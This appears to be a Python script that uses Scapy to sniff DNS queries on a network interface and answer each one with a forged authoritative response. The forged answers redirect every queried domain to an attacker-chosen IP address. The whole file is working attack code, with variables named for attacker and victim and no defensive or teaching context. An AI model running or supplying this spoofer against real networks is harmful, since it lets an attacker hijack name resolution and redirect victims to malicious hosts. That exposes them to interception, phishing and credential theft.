from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, Ether, sendp
import logging

def spoof_dns_packet(pkt, fake_ip, attacker_mac, iface):
    # Check if it's a DNS query (qr == 0)
    if pkt.haslayer(DNSQR) and pkt[DNS].qr == 0:
        queried_domain = pkt[DNSQR].qname.decode().strip(".")
        victim_ip = pkt[IP].src

        print("[*] DNS request detected for: {}".format(queried_domain))
        print("[+] Spoofing all DNS responses to: {}".format(fake_ip))

        # Build spoofed DNS response
        ether = Ether(src=attacker_mac, dst=pkt[Ether].src)
        ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
        udp = UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
        dns = DNS(
            id=pkt[DNS].id,
            qr=1, aa=1, qd=pkt[DNS].qd,
            an=DNSRR(rrname=pkt[DNSQR].qname, ttl=300, rdata=fake_ip)
        )

        spoofed_response = ether / ip / udp / dns
        sendp(spoofed_response, iface=iface, verbose=False)

def start_dns_spoofer(fake_ip, attacker_mac, iface):
    from scapy.all import sniff

    print("[*] Starting DNS spoofing (ALL domains)...")
    print("[*] Responding with fake IP: {}".format(fake_ip))

    try:
        sniff(
            iface=iface,
            filter="udp port 53",
            prn=lambda pkt: spoof_dns_packet(pkt, fake_ip, attacker_mac, iface),
            store=False
        )
    except KeyboardInterrupt:
        print("\n[!] DNS spoofing stopped by user.")
